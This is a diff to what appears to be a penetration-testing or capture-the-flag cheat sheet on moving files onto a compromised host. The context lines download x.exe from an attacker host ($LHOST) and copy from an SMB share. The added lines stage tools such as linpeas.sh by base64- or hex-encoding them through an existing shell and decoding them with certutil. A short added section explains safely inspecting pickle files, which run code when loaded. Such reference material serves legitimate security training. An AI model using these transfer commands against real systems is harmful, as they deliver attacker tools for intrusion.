@@ -417,6 +417,16 @@ powershell -c "iwr http://$LHOST/x.exe -o x.exe"
 # via SMB (Windows pull)
 impacket-smbserver share . -smb2support     # your box
 copy \\$LHOST\share\file.exe                 # target
+# no outbound at all? move it through the shell you already have
+base64 -w0 linpeas.sh                        # your box (-w0 or the paste wraps and breaks); xxd -p if b64 is filtered
+echo '<blob>' | base64 -d > /tmp/x && chmod +x /tmp/x   # target;  echo '<hex>' | xxd -r -p > /tmp/x
+certutil -decode b64.txt out.exe             # Windows target
+```
+
+**Inspect a file, do not run it** — a `.pkl`/`.joblib`/`.pt` is pickle = code; `pickle.load()` runs its `__reduce__` as you.
+```bash
+file thing.pkl; xxd thing.pkl | head; strings -n 6 thing.pkl   # posix/system/eval in the strings = the answer
+# magic: 80 04=pickle  ac ed 00 05=java  50 4b 03 04=zip/jar/docx  7f 45 4c 46=ELF
 ```
 
 ## Privilege escalation, first moves
